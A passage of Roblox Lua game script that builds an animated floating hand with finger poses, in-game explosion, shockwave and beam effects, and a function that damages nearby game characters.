	pPoint1 =  pa(m,"Block",fingwide,finghei*s,fingwide,true,false,HTrans,HRef,HCol)  mbm(pPoint1,0.9,1,0.9)
	wPoint1 =  weld(pPoint1,bPoint1,pPoint1,0,pPoint1.Size.y/2,0,0,0,0)
	bPoint2 =  pa(m,"Block",0,0,0,false,false,HTrans,HRef,HCol)
	Point2 =  weld(bPoint2,pPoint1,bPoint2,0,pPoint1.Size.y/2,0,0,0,0)
	pPoint2 =  pa(m,"Block",fingwide,finghei*s,fingwide,true,false,HTrans,HRef,HCol)  mbm(pPoint2,0.9,1,0.9)
	wPoint2 =  weld(pPoint2,bPoint2,pPoint2,0,pPoint1.Size.y/2,0,0,0,0)
	bPoint3 =  pa(m,"Block",0,0,0,false,false,HTrans,HRef,HCol)
	Point3 =  weld(bPoint3,pPoint2,bPoint3,0,pPoint2.Size.y/2,0,0,0,0)
	pPoint3 =  pa(m,"Block",fingwide,tiphei*s,fingwide,true,false,HTrans,HRef,HCol)  mbm(pPoint3,0.9,1,0.9)
	wPoint3 =  weld(pPoint3,bPoint3,pPoint3,0,pPoint3.Size.y/2,0,0,0,0)
	bMid1 =  pa(m,"Block",0,0,0,false,false,HTrans,HRef,HCol)
	Mid1 =  weld(bMid1,Palm,bMid1,-x/2+((fingwide/2)+((fingwide)*1)),y/2,0,0,0,0)
	pMid1 =  pa(m,"Block",fingwide,(finghei*1.1)*s,fingwide,true,false,HTrans,HRef,HCol)  mbm(pMid1,0.9,1,0.9)
	wMid1 =  weld(pMid1,bMid1,pMid1,0,pMid1.Size.y/2,0,0,0,0)
	bMid2 =  pa(m,"Block",0,0,0,false,false,HTrans,HRef,HCol)
	Mid2 =  weld(bMid2,pMid1,bMid2,0,pMid1.Size.y/2,0,0,0,0)
	pMid2 =  pa(m,"Block",fingwide,(finghei*1.1)*s,fingwide,true,false,HTrans,HRef,HCol)  mbm(pMid2,0.9,1,0.9)
	wMid2 =  weld(pMid2,bMid2,pMid2,0,pMid1.Size.y/2,0,0,0,0)
	bMid3 =  pa(m,"Block",0,0,0,false,false,HTrans,HRef,HCol)
	Mid3 =  weld(bMid3,pMid2,bMid3,0,pMid2.Size.y/2,0,0,0,0)
	pMid3 =  pa(m,"Block",fingwide,(tiphei*1.1)*s,fingwide,true,false,HTrans,HRef,HCol)  mbm(pMid3,0.9,1,0.9)
	wMid3 =  weld(pMid3,bMid3,pMid3,0,pMid3.Size.y/2,0,0,0,0)
	bRing1 =  pa(m,"Block",0,0,0,false,false,HTrans,HRef,HCol)
	Ring1 =  weld(bRing1,Palm,bRing1,-x/2+((fingwide/2)+((fingwide)*2)),y/2,0,0,0,0)
	pRing1  = pa(m,"Block",fingwide,(finghei*0.98)*s,fingwide,true,false,HTrans,HRef,HCol)  mbm(pRing1,0.9,1,0.9)
	wRing1 =  weld(pRing1,bRing1,pRing1,0,pRing1.Size.y/2,0,0,0,0)
	bRing2 =  pa(m,"Block",0,0,0,false,false,HTrans,HRef,HCol)
	Ring2 =  weld(bRing2,pRing1,bRing2,0,pRing1.Size.y/2,0,0,0,0)
	pRing2 =  pa(m,"Block",fingwide,(finghei*0.98)*s,fingwide,true,false,HTrans,HRef,HCol)  mbm(pRing2,0.9,1,0.9)
	wRing2 =  weld(pRing2,bRing2,pRing2,0,pRing1.Size.y/2,0,0,0,0)
	bRing3 =  pa(m,"Block",0,0,0,false,false,HTrans,HRef,HCol)
	Ring3 =  weld(bRing3,pRing2,bRing3,0,pRing2.Size.y/2,0,0,0,0)
	pRing3 =  pa(m,"Block",fingwide,(tiphei*0.98)*s,fingwide,true,false,HTrans,HRef,HCol)  mbm(pRing3,0.9,1,0.9)
	wRing3 =  weld(pRing3,bRing3,pRing3,0,pRing3.Size.y/2,0,0,0,0)
	bPinkie1 =  pa(m,"Block",0,0,0,false,false,HTrans,HRef,HCol)
	Pinkie1 =  weld(bPinkie1,Palm,bPinkie1,-x/2+((fingwide/2)+((fingwide)*3)),y/2,0,0,0,0)
	pPinkie1  = pa(m,"Block",fingwide,(finghei*0.8)*s,fingwide,true,false,HTrans,HRef,HCol)  mbm(pPinkie1,0.9,1,0.9)
	wPinkie1 =  weld(pPinkie1,bPinkie1,pPinkie1,0,pPinkie1.Size.y/2,0,0,0,0)
	bPinkie2 =  pa(m,"Block",0,0,0,false,false,HTrans,HRef,HCol)
	Pinkie2 =  weld(bPinkie2,pPinkie1,bPinkie2,0,pPinkie1.Size.y/2,0,0,0,0)
	pPinkie2 =  pa(m,"Block",fingwide,(finghei*0.8)*s,fingwide,true,false,HTrans,HRef,HCol)  mbm(pPinkie2,0.9,1,0.9)
	wPinkie2 =  weld(pPinkie2,bPinkie2,pPinkie2,0,pPinkie1.Size.y/2,0,0,0,0)
	bPinkie3 =  pa(m,"Block",0,0,0,false,false,HTrans,HRef,HCol)
	Pinkie3 =  weld(bPinkie3,pPinkie2,bPinkie3,0,pPinkie2.Size.y/2,0,0,0,0)
	pPinkie3 =  pa(m,"Block",fingwide,(tiphei*0.8)*s,fingwide,true,false,HTrans,HRef,HCol)  mbm(pPinkie3,0.9,1,0.9)
	wPinkie3 =  weld(pPinkie3,bPinkie3,pPinkie3,0,pPinkie3.Size.y/2,0,0,0,0)
	bThumb1 =  pa(m,"Block",0,0,0,false,false,HTrans,HRef,HCol)
	Thumb1 =  weld(bThumb1,Palm,bThumb1,-x/2+(fingwide/7),-y*0.1,-fingwide*0.25,0,0,0)
	pThumb1  =  pa(m,"Block",fingwide*1.4,(finghei*1)*s,fingwide*1.4,true,false,HTrans,HRef,HCol)  mbm(pThumb1,0.9,1,0.9)
	wThumb1 =  weld(pThumb1,bThumb1,pThumb1,0,pThumb1.Size.y/2,0,0,0,0)
	bThumb2 =  pa(m,"Block",0,0,0,false,false,HTrans,HRef,HCol)
	Thumb2 =  weld(bThumb2,pThumb1,bThumb2,0,pThumb1.Size.y/2,0,0,0,0)
	pThumb2 =  pa(m,"Block",fingwide*1.3,(finghei*1)*s,fingwide*1.3,true,false,HTrans,HRef,HCol)  mbm(pThumb2,0.9,1,0.9)
	wThumb2 =  weld(pThumb2,bThumb2,pThumb2,0,pThumb1.Size.y/2,0,0,0,0)
	bThumb3 =  pa(m,"Block",0,0,0,false,false,HTrans,HRef,HCol)
	Thumb3 =  weld(bThumb3,pThumb2,bThumb3,0,pThumb2.Size.y/2,0,0,0,0)
	pThumb3 =  pa(m,"Block",fingwide*1.25,(tiphei*1)*s,fingwide*1.25,true,false,HTrans,HRef,HCol)  mbm(pThumb3,0.9,1,0.9)
	wThumb3 =  weld(pThumb3,bThumb3,pThumb3,0,pThumb3.Size.y/2,0,0,0,0)

	w["a1"] =  Pinkie1
	w["a2"] = Pinkie2
	w["a3"] = Pinkie3
	w["b1"] = Ring1
	w["b2"]  = Ring2
	w["b3"] = Ring3
	w["c1"] = Mid1
	w["c2"] = Mid2
	w["c3"] =  Mid3
	w["d1"] = Point1
	w["d2"] = Point2
	w["d3"] = Point3
	w["e1"] =  Thumb1
	w["e2"] = Thumb2
	w["e3"] = Thumb3
	w.e1.C1 =  ca(0,rd(35),rd(-20))
	w.e2.C1 = ca(rd(20),0,0)
	w.e3.C1 =  ca(rd(20),0,0)
	w.d1.C1 = ca(0,0,rd(-3))
	w.c1.C1 =  ca(0,0,rd(-1))
	w.b1.C1 = ca(0,0,rd(1))
	w.a1.C1 = ca(0,0,rd(3))
	function  c1(wexx,smmx,xx,yy,zz) 
		coroutine.resume(coroutine.create(function()
			local  xx2,yy2,zz2 = wexx.C1:toEulerAnglesXYZ() 
			local aa,bb,cc =  wexx.C0.x,wexx.C0.y,wexx.C0.z
			local twa = smmx/wt
			Anim.Welding =  Anim.Welding + 1
			for i=0,twa,1 do wexx.C0 = cf(aa,bb,cc)
				wexx.C1 =  ca(xx2-(((xx2-rd(xx))/twa)*i),yy2-(((yy2-rd(yy))/twa)*i),zz2-(((zz2-rd(zz))/twa)*i))
				wait()
			end  
			Anim.Welding = Anim.Welding - 1
		end))
	end 
	function  CloseFing(fingz,spee) if spee == nil then spee = 1 end c1(w[fingz..  "1"],spee,80,0,0) c1(w[fingz.. "2"],spee,110,0,0) c1(w[fingz.. "3"],spee,30,0,0)  end
	function OpenFing(fingz,spee) if spee == nil then spee = 1 end  c1(w[fingz.. "1"],spee,2,0,0) c1(w[fingz.. "2"],spee,2,0,0) c1(w[fingz..  "3"],spee,2,0,0) end 
	function HandSign(form,spee) form = form:lower() if  spee == nil then spee = 1 end 
		if form == "f" then 
			CloseFing("d",spee)  CloseFing("a",spee) CloseFing("b",spee)
			c1(w["c1"],spee,0,0,0)  c1(w["c2"],spee,0,0,0) c1(w["c3"],spee,0,0,0) 
			c1(w["e1"],spee,70,40,-90)  c1(w["e2"],spee,50,0,0) c1(w["e3"],spee,50,0,0) 
		elseif form == "fist"  then
			CloseFing("d",spee) CloseFing("a",spee) CloseFing("b",spee)  CloseFing("c",spee)
			c1(w["e1"],spee,70,40,-90) c1(w["e2"],spee,50,0,0)  c1(w["e3"],spee,50,0,0) 
		elseif form == "pointer" then
			CloseFing("a",spee)  CloseFing("b",spee) CloseFing("c",spee)
			c1(w["d1"],spee,5,0,0)  c1(w["d2"],spee,5,0,0) c1(w["d3"],spee,5,0,0) 
			c1(w["e1"],spee,70,40,-90)  c1(w["e2"],spee,50,0,0) c1(w["e3"],spee,50,0,0) 
		elseif form == "v"  then
			CloseFing("a",spee) CloseFing("b",spee)
			c1(w["c1"],spee,1,0,15)  c1(w["c2"],spee,1,0,0) c1(w["c3"],spee,1,0,0) 
			c1(w["d1"],spee,1,0,-15)  c1(w["d2"],spee,1,0,0) c1(w["d3"],spee,1,0,0) 
			c1(w["e1"],spee,70,40,-90)  c1(w["e2"],spee,50,0,0) c1(w["e3"],spee,50,0,0) 
		elseif form == "free" or  form == "five" then
			OpenFing("a",spee) OpenFing("b",spee) OpenFing("c",spee)  OpenFing("d",spee) 
			c1(w["e1"],spee,0,35,-20) c1(w["e2"],spee,20,0,0)  c1(w["e3"],spee,20,0,0) 
		elseif form == "ride" then  
			c1(w["a1"],spee,60,0,0) c1(w["a2"],spee,-30,0,0) c1(w["a3"],spee,-30,0,0)  
			c1(w["b1"],spee,30,0,0) c1(w["b2"],spee,65,0,0) c1(w["b3"],spee,60,0,0)  
			c1(w["c1"],spee,30,0,0) c1(w["c2"],spee,65,0,0) c1(w["c3"],spee,60,0,0)  
			c1(w["d1"],spee,30,0,0) c1(w["d2"],spee,65,0,0) c1(w["d3"],spee,60,0,0)  
			c1(w["e1"],spee,-70,185,0) c1(w["e2"],spee,30,0,0) c1(w["e3"],spee,30,0,0)  
		elseif form == "gun" then
			CloseFing("a",spee)  CloseFing("b",spee)
			c1(w["c1"],spee,0,0,1) c1(w["c2"],spee,0,0,0)  c1(w["c3"],spee,0,0,0) 
			c1(w["d1"],spee,0,0,-1) c1(w["d2"],spee,0,0,0)  c1(w["d3"],spee,0,0,0) 
			c1(w["e1"],spee,-60,90,0) c1(w["e2"],spee,20,0,0)  c1(w["e3"],spee,-20,0,0) 
		elseif form == "wide"  then
			c1(w["a1"],spee,-3,0,45) c1(w["a2"],spee,-3,0,0) c1(w["a3"],spee,-3,0,0)  
			c1(w["b1"],spee,-3,0,15) c1(w["b2"],spee,-3,0,0) c1(w["b3"],spee,-3,0,0)  
			c1(w["c1"],spee,-3,0,-15) c1(w["c2"],spee,-3,0,0) c1(w["c3"],spee,-3,0,0)  
			c1(w["d1"],spee,-3,0,-45) c1(w["d2"],spee,-3,0,0) c1(w["d3"],spee,-3,0,0)  
			c1(w["e1"],spee,-70,90,0) c1(w["e2"],spee,10,0,0) c1(w["e3"],spee,-10,0,0)  
		elseif form == "wide2" then
			c1(w["a1"],spee,-18,0,45)  c1(w["a2"],spee,36,0,0) c1(w["a3"],spee,30,0,0) 
			c1(w["b1"],spee,-18,0,15)  c1(w["b2"],spee,36,0,0) c1(w["b3"],spee,30,0,0) 
			c1(w["c1"],spee,-18,0,-15)  c1(w["c2"],spee,36,0,0) c1(w["c3"],spee,30,0,0) 
			c1(w["d1"],spee,-18,0,-45)  c1(w["d2"],spee,36,0,0) c1(w["d3"],spee,30,0,0) 
			c1(w["e1"],spee,-50,90,-10)  c1(w["e2"],spee,5,0,-30) c1(w["e3"],spee,-10,0,-40) 
		elseif form == "grab2"  then
			c1(w["a1"],spee,-70,-65,0) c1(w["a2"],spee,40,0,0)  c1(w["a3"],spee,20,0,0) 
			c1(w["b1"],spee,-70,-20,0) c1(w["b2"],spee,40,0,0)  c1(w["b3"],spee,20,0,0) 
			c1(w["c1"],spee,-70,20,-0) c1(w["c2"],spee,40,0,0)  c1(w["c3"],spee,20,0,0) 
			c1(w["d1"],spee,-70,65,-0) c1(w["d2"],spee,40,0,0)  c1(w["d3"],spee,20,0,0) 
			c1(w["e1"],spee,-70,150,0) c1(w["e2"],spee,30,0,0)  c1(w["e3"],spee,30,0,0) 
		elseif form == "grab3"  then
			c1(w["a1"],spee,-30,-40,30) c1(w["a2"],spee,50,0,0)  c1(w["a3"],spee,35,0,0) 
			c1(w["b1"],spee,-30,-15,12) c1(w["b2"],spee,50,0,0)  c1(w["b3"],spee,35,0,0) 
			c1(w["c1"],spee,-30,15,-12) c1(w["c2"],spee,50,0,0)  c1(w["c3"],spee,35,0,0) 
			c1(w["d1"],spee,-30,40,-30) c1(w["d2"],spee,50,0,0)  c1(w["d3"],spee,35,0,0) 
			c1(w["e1"],spee,-55,205,0) c1(w["e2"],spee,30,0,0)  c1(w["e3"],spee,30,0,0) 
		end
	end
	function  ColFings(iscol)
		pPinkie1.CanCollide = iscol
		pPinkie2.CanCollide =  iscol
		pPinkie3.CanCollide = iscol
		pRing1.CanCollide =  iscol
		pRing2.CanCollide = iscol
		pRing3.CanCollide =  iscol
		pMid1.CanCollide = iscol
		pMid2.CanCollide =  iscol
		pMid3.CanCollide = iscol
		pPoint1.CanCollide =  iscol
		pPoint2.CanCollide = iscol
		pPoint3.CanCollide =  iscol
		pThumb1.CanCollide = iscol
		pThumb2.CanCollide =  iscol
		pThumb3.CanCollide = iscol
	end
	function ray(Pos, Dir) 
		return  Workspace:FindPartOnRay(Ray.new(Pos, Dir.unit *999), c) 
	end 
	function  Earthsplosion(pos,siz,dmg,rndmg,forc,eos) local colz22 = "Really red" if eos ==  nil or eos == "earth" then eos = "earth" else colz22 = "Really black" eos =  "sand" end 
		coroutine.resume(coroutine.create(function() 
			if eos ==  "earth" then local cr =  pa(m,"Block",((14*siz)/10)*s,0,((14*siz)/10)*s,false,false,1,0,"") cr.Anchored =  true cr.CFrame = pos *ca(rd(0),rd(ra(-360,360)),rd(0)) cr.CFrame = cr.CFrame +  v3(ra(-siz*10,siz*10)/22,0,ra(-siz*10,siz*10)/22)
				local de = it("Decal",cr)  de.Face = "Top" de.Texture = asset .. Decs.Crack Serv.d:AddItem(cr,25)  end
			for i=1,4 do
				coroutine.resume(coroutine.create(function() 
					local sw  = pa(m,"Block",(siz/3)*s,(siz*1.3)*s,(siz/3)*s,true,true,0,0,colz22) sw.Anchored  = true sw.CFrame = pos *cf(ra(-3*s,3*s),0,ra(-3*s,3*s))  *ca(rd(ra(-27,27)),rd(ra(-360,360)),rd(ra(-27,27))) local swm =  it("SpecialMesh",sw) if eos == "earth" then swm.MeshType =  "FileMesh"
						swm.MeshId = asset .. Decs.Spike else swm.MeshType = "Sphere" end  if eos == "earth" then swm.Scale =  v3(sw.Size.x/1.3,sw.Size.y*1.2,sw.Size.z/1.3)
					else swm.Scale =  v3(sw.Size.x/10,sw.Size.y/37,sw.Size.z/10) end sw.CFrame = sw.CFrame +  v3(ra(-0.3*siz*s,0.3*siz*s,7),0,ra(-0.3*siz*s,0.3*siz*s)) sw.CFrame = sw.CFrame  * cf(0,-sw.Size.y/1.4,0)
					Dustplosion(cf(pos.p+v3(0,2*s,0)),18*s,{"Really  red","Really black","Really red"},1)
					if eos == "earth" then 
						for x=1,8  do
							sw.CFrame = sw.CFrame *cf(0,sw.Size.y/8,0) wait() end wait(ra(1,5))
						for  x=1,20 do
							sw.CFrame = sw.CFrame *cf(0,-sw.Size.y/20,0) wait()
						end  sw:Remove()
					else 
						for x=1,25 do
							sw.CFrame = sw.CFrame  *cf(0,sw.Size.y/25,0) sw.Transparency = x/25 - 0.1 swm.Scale = swm.Scale +  v3(0.025,0.025,0.025) wait() end
					end sw:Remove()
				end)) end  
			wait(0.3)
			DmgHumanoidsNear(pos.p,dmg,rndmg,5.5*s*(siz/4),forc)
		end))
	end

	function  Dustplosion(onb,scale,col,cls) coroutine.resume(coroutine.create(function()  
			for x=1,cls do coroutine.resume(coroutine.create(function() 
					local sw =  pa(m,"Block",1*s,0,1*s,false,false,0.2,0,col[ra(1,#col)]) sw.Anchored = true  sw.CFrame = onb *ca(rd(ra(-35,35)),rd(ra(-360,360)),rd(ra(-35,35))) local swm =  it("SpecialMesh",sw) swm.MeshType = "FileMesh"
					swm.MeshId = asset ..  Decs.Cloud sw.CFrame = sw.CFrame +  v3(ra(-scale,scale)/8,ra(-scale,scale)/8,ra(-scale,scale)/8) 
					for  i=1,scale,0.25 do 
						swm.Scale = v3(i*1.5,i*1,i*1.5) sw.Transparency =  ((i/scale)/2) + 0.45
						wait()
					end
					sw:Remove()
				end)) end 
		end)) end  
	function ShockWave(onb,scale,col)  coroutine.resume(coroutine.create(function() local sw =  pa(m,"Block",1*s,0,1*s,false,false,0.2,0,col) sw.Anchored = true sw.CFrame = onb  *ca(rd(90),0,0) local swm = it("SpecialMesh",sw) swm.MeshType = "FileMesh"  swm.MeshId = RingMesh.MeshId 
			for i=1,scale,0.75 do swm.Scale =  v3(i*1.5,i*1.5,i*1.5) sw.Transparency = (i/scale) + 0 wait() end sw:Remove()  end)) end 
	function BlastWave(onb,scale,ymes,col)  coroutine.resume(coroutine.create(function() 
			local sw =  pa(m,"Block",1*s,0,1*s,false,false,0.2,0,col) sw.Anchored = true sw.CFrame = onb  *ca(rd(0),0,0) local swm = it("SpecialMesh",sw) swm.MeshType =  "FileMesh"
			swm.MeshId = BlastMesh.MeshId 
			for i=1,scale,scale/11 do  
				swm.Scale = v3(i*1.25,i*ymes,i*1.25) sw.CFrame = sw.CFrame  *ca(0,rd(720*(i/scale)),0) sw.Transparency = (i/scale) +  0
				wait()
			end
			sw:Remove()
		end))
	end 
	function  Explode(onb,scale,col) local Torm = m  coroutine.resume(coroutine.create(function() local e1 = Instance.new("Part")  e1.Anchored = true e1.formFactor = "Custom" e1.CanCollide = false e1.Size =  Vector3.new(1,1,1) e1.BrickColor = BrickColor.new(col) 
			e1.Transparency = 0.6  e1.TopSurface = 0 e1.BottomSurface = 0 e1.Parent = Torm e1.CFrame = onb local  e1m = Instance.new("SpecialMesh") 
			e1m.MeshType = "Sphere" e1m.Parent = e1  local r1 = Instance.new("Part") r1.Anchored = true r1.formFactor = "Custom"  r1.CanCollide = false r1.Size = Vector3.new(1,1,1) r1.BrickColor =  BrickColor.new(col) r1.Transparency = 0.6 r1.TopSurface = 0 r1.BottomSurface = 0  r1.Parent = Torm r1.CFrame = e1.CFrame *CFrame.Angles(math.rad(180),0,0) local  r1m = Instance.new("SpecialMesh") r1m.MeshType = "FileMesh" 
			r1m.Scale =  Vector3.new(3,3,3) r1m.Parent = r1 r1m.MeshId = RingMesh.MeshId local r2 =  Instance.new("Part") r2.Anchored = true r2.formFactor = "Custom" r2.CanCollide =  false r2.Size = Vector3.new(1,1,1) r2.BrickColor = BrickColor.new(col)  r2.Transparency = 0.6 r2.TopSurface = 0 r2.BottomSurface = 0 r2.Parent = Torm  r2.CFrame = e1.CFrame *CFrame.Angles(0,math.rad(180),0) local r2m =  Instance.new("SpecialMesh") r2m.MeshType = "FileMesh" 
			r2m.Parent = r2  r2m.Scale = Vector3.new(3,3,3) r2m.MeshId = RingMesh.MeshId local bla =  Instance.new("Part") bla.Anchored = true 
			bla.formFactor = "Custom"  bla.CanCollide = false bla.Size = Vector3.new(1,1,1) bla.BrickColor =  BrickColor.new(col) bla.Transparency = 0.6 bla.TopSurface = 0 bla.BottomSurface  = 0 bla.Parent = Torm bla.CFrame = onb local blam = Instance.new("SpecialMesh")  
			blam.MeshType = "FileMesh" blam.Parent = bla blam.Scale = Vector3.new(5,5,5)  blam.MeshId = BlastMesh.MeshId for i=1,30 do local pluscal = scale/38 e1m.Scale  = e1m.Scale + Vector3.new(pluscal,pluscal,pluscal) 
				r1m.Scale = r1m.Scale +  Vector3.new(pluscal,pluscal,pluscal) r2m.Scale = r1m.Scale +  Vector3.new(pluscal,pluscal,pluscal)
				blam.Scale = blam.Scale +  Vector3.new(pluscal,pluscal/2,pluscal) bla.CFrame = bla.CFrame *  CFrame.Angles(0,math.rad(12),0) r1.CFrame = r1.CFrame *  CFrame.Angles(math.rad(6),0,0) r2.CFrame = r2.CFrame *  CFrame.Angles(0,math.rad(6),0) wait() end for i=1,30 do local pluscal = scale/38  e1m.Scale = e1m.Scale + Vector3.new(pluscal,pluscal,pluscal) r1m.Scale =  r1m.Scale + Vector3.new(pluscal,pluscal,pluscal) r2m.Scale = r1m.Scale +  Vector3.new(pluscal,pluscal,pluscal)
				blam.Scale = blam.Scale +  Vector3.new(pluscal/3,pluscal/3,pluscal/3) bla.CFrame = bla.CFrame *  CFrame.Angles(0,math.rad(12),0) r1.CFrame = r1.CFrame *  CFrame.Angles(math.rad(6),0,0) r2.CFrame = r2.CFrame *  CFrame.Angles(0,math.rad(6),0) bla.Transparency = bla.Transparency + 0.1  e1.Transparency = e1.Transparency + 0.1 r1.Transparency = r1.Transparency + 0.1  r2.Transparency = r2.Transparency + 0.1 wait() end e1:Remove() r1:Remove()  r2:Remove() end)) end

	function  Hurtsplosion(pos,dmg,rndmg,siz,forc)
		coroutine.resume(coroutine.create(function()  local boomcol = {"Really red","Really black","Really red"}
			for i=1,3 do  
				coroutine.resume(coroutine.create(function()
					local plos =  pa(m,"Block",1*s*siz,1.5*s*siz,0.7*s*siz,false,false,0.3,0,boomcol)  spm("Sphere",plos,1) plos.Anchored = true
					plos.CFrame = cf(pos + v3(0,0,0)) *  ca(rd(ra(-360,360)),rd(ra(-360,360)),rd(ra(-360,360)))
					plos.Mesh.Scale =  v3(0.1,0.1,0.1)
					for i=0.3,1,0.03 do local plc =  plos.CFrame
						plos.Mesh.Scale = v3(i*6,i*6,i*6) plos.Transparency = i  plos.CFrame = plc *  ca(rd(3),rd(3),0)
						wait()
					end
					plos:Remove()
				end))
			end  
		end))
		wait(0.1)
		DmgHumanoidsNear(pos,dmg,rndmg,5.5*s*siz,forc)
	end

	function  DmgHumanoidsNear(pos,dmg,rndmg,mag,forc) 
		local function kidive(ob) 
			for  i,v in pairs(ob:children()) do 
				if v:IsA("BasePart") and  v.Parent.Parent:findFirstChild("Humanoid") == nil and  v.Parent:findFirstChild("Humanoid") == nil and (v.Position - pos).magnitude <  mag*1.3 and v.Anchored == false and v:GetMass() < 150 then  
					v:BreakJoints() v.Velocity = cf(pos,v.Position).lookVector*forc
				end
				if  v:IsA("Humanoid") and v ~= hu and v.Parent:findFirstChild("Torso") then 
					if  (pos - v.Parent.Torso.Position).magnitude < mag then local tdmg =  dmg*ra(1,rndmg) 
						if v.Parent:findFirstChild("Hh") == nil then local hh=  Instance.new("NumberValue",v.Parent) hh.Name = "Hh"
							hh.Value = v.Health -  tdmg else v.Parent.Hh.Value = v.Health - (tdmg*3.5) end 
						v.Health =  v.Parent.Hh.Value if v.Parent.Hh.Value < 1 then v.Parent:BreakJoints() end  
					end 
				end 
				if v:IsA("Model") or v:IsA("Workspace") then kidive(v) end  end end 
		kidive(workspace) 
	end 
	function  Fire(bullet,typez,siz,dmg,rndmg,forc)
		if typez == 1 then
			bullet.Anchored =  true 
			local bullethit = false
			local tyms = 0
			repeat
				tyms = tyms +  2
				local bhit,bpos = ray(bullet.Position,bullet.Position - (bullet.CFrame  *cf(0,0,-1)).p) 
				if bpos ~= nil and (bpos - bullet.Position).magnitude < 7  then bullethit = true else bullet.CFrame = bullet.CFrame *cf(0,0,-1*s)  *ca(rd(-0.0025),rd(0),0) end 
				if tyms%32 == 0 then wait() end 
			until  bullethit or bullet.Position.y < -300 or tyms > 800 
			bullet.CFrame =  bullet.CFrame *cf(0,0,8) bullet:Remove()
			if bullet.Position.y < -300  then
			else
				Hurtsplosion(bullet.Position,dmg,rndmg,siz,forc)
			end
		elseif  typez == 2 then
			bullet.Anchored = true 
			local bullethit = false
			local  tyms = 0
			local ming = 0.001
			repeat 
				if tyms > 70 and (ming == 0.001  or ming == -2.5) then ming = -2.5
					local bpos = (bullet.CFrame  *cf(0,0,-300)).p if (bpos -  v3(Palm.Position.x,bpos.y,Palm.Position.z)).magnitude < 25*s then ming = 0  end 
				end
				tyms = tyms + 2
				local bhit,bpos =  ray(bullet.Position,bullet.Position - (bullet.CFrame *cf(0,0,-1)).p) 
				if bpos  ~= nil and (bpos - bullet.Position).magnitude < 7 then bullethit = true else  bullet.CFrame = bullet.CFrame *cf(0,0,-0.5) *ca(rd(ming),rd(0),0) end 
				if  tyms%16 == 0 then wait() end 
			until bullethit or bullet.Position.y < -300  or tyms > 500 
			bullet.CFrame = bullet.CFrame *cf(0,0,8)  bullet:Remove()
			if bullet.Position.y < -300  then
			else
				Hurtsplosion(bullet.Position,dmg,rndmg,siz,forc)
			end
		elseif  typez == 3 then 
		end
	end 
	function ShortifiedAnim(theanim)
		if  theanim == "Beam" then
			local crom =  pa(m,"Block",0,0,0,true,true,0.5,0,LaserCol3) local cromm =  it("SpecialMesh",crom) cromm.MeshType = "FileMesh" cromm.MeshId = asset ..  Decs.Crown
			cromm.Scale = v3(15*s,5*s,15*s) crom.Anchored = true --local cromw  = weld(crom,Palm,crom,0,Palm.Size.y/3.6,-Palm.Size.z*1.8,rd(-90),0,0)
			dias =  {} loldiv = 360/8 for x=0,360,loldiv do 
				local dia =  pa(m,"Block",0,0,0,false,false,0,0,LaserCol2) dia.Anchored = true local diam =  it("SpecialMesh",dia) diam.MeshType = "FileMesh" diam.MeshId =  DiamondMesh.MeshId
				diam.Scale = v3(3*s,9*s,3*s) table.insert(dias,dia)
			end  Button = true coroutine.resume(coroutine.create(function() local tardz = 0  repeat wait() tardz = tardz+ 15
					crom.CFrame = Palm.CFrame *ca(rd(-90),0,0)  *cf(0,5.5*s,2*s) *ca(0,rd(tardz),0) 
					for rofl=1,#dias do dias[rofl].CFrame =  crom.CFrame *ca(0,rd(rofl*loldiv),0) *cf(0,-19*s,0) *ca(rd(25),0,0)  *cf(0,32*s,0) end 
				until not Button for x2=0.5,1,0.05 do wait()  crom.Transparency = x2 end end))
			coroutine.resume(coroutine.create(function()  for xk=1,0.5,-0.02 do wait() for i=1,#dias do dias.Transparency =xk end end  end))
			wait(1) local beamoffset = v3(0,0,0)
			local b1 =  pa(m,"Ball",10*s,10*s,10*s,false,false,0.1,0,LaserCol) b1.Anchored = true  
			local b2 = pa(m,"Block",10*s,1,10*s,false,false,0.1,0,LaserCol) b2.Anchored  = true local b2m = it("CylinderMesh",b2)
			local b3 =  pa(m,"Ball",10*s,10*s,10*s,false,false,0.1,0,LaserCol) b3.Anchored = true  
			local bpos = nil local bhit = nil local ts = 0
			repeat beamoffset =  v3(ra(-2*s,2*s),ra(-2*s,2*s),ra(-2*s,2*s)) ts = ts + 1
				bhit,bpos =  ray(Palm.Position,Palm.Position - (Palm.CFrame *cf(0,0,1)).p) 
				if bhit == nil  or (Palm.Position - bpos).magnitude > 1500 then break end 
				b1.CFrame =  Palm.CFrame *cf(0,3*s,-11*s) 
				b3.CFrame = cf(bpos) local lenz = (b1.Position  - b3.Position).magnitude 
				b2.CFrame = cf(b1.Position,b3.Position)  *ca(rd(90),0,0) *cf(0,-lenz/2,0) b2m.Scale = v3(1,lenz,1)
				b1.CFrame =  b1.CFrame + beamoffset b2.CFrame = b2.CFrame + beamoffset b3.CFrame = b3.CFrame  + beamoffset 
				if ts%10 == 0 then  DmgHumanoidsNear(b3.Position,3,10,(14*s)+2,100)  Explode(b3.CFrame*cf(0,b3.Size.y/3,0),25*s,LaserCol2) end
				wait() until not  Button or ts > 600
			coroutine.resume(coroutine.create(function() for  xk=0.1,1.1,0.08 do wait() b1.Transparency = xk b2.Transparency = xk  b3.Transparency = xk end b1:Remove() b2:Remove() b3:Remove()  end))
			coroutine.resume(coroutine.create(function() for xk=0.5,1.1,0.02 do  wait() for i=1,#dias do dias.Transparency =xk end end end))
			wait(1)  clearit(dias) crom:Remove()
		end
	end 
	PalmLev = it("BodyPosition",Palm)  
	PalmFace = it("BodyGyro",Palm) PalmFace.maxTorque =  v3(0,0,0)
	coroutine.resume(coroutine.create(function()
		PalmLev.position =  (t.CFrame *cf(handoffset)).p
		local yspi = 0
		while true do yspi = yspi +  8
			if Anim.a == "Gun" or Anim.a == "Ride" or Anim.a == "Pound" then 
				Facing  = "Mouse" bgx = -90 bgy = 90 bgz = 0 
			elseif Anim.a == "Fu" or Anim.a ==  "Fist" or Anim.a == "GroundGrip" then 
				Facing = "Mouse" bgx = -90 bgy = 0 bgz  = 0 
			elseif Anim.a == "Splat" or Anim.a == "Beam" then
				Facing = "Mouse"  bgx = 0 bgy = 0 bgz = 0 
			elseif Anim.a == "None" then 
				Facing = "Owner"  bgx = -90 bgy = 0 bgz = 0 Posing = "Follow"
			elseif Anim.a == "Shower"  then
				Facing = "None" bgx = 0 bgy = 0 bgz = 0 Posing = "TopOwner"
			end  
			if Posing == "Follow" then 
				PalmLev.maxForce = v3(1/0,1/0,1/0)  PalmLev.position = (t.CFrame *cf(handoffset) *cf(0,0,0)).p 
			elseif Posing ==  "TopOwner" then
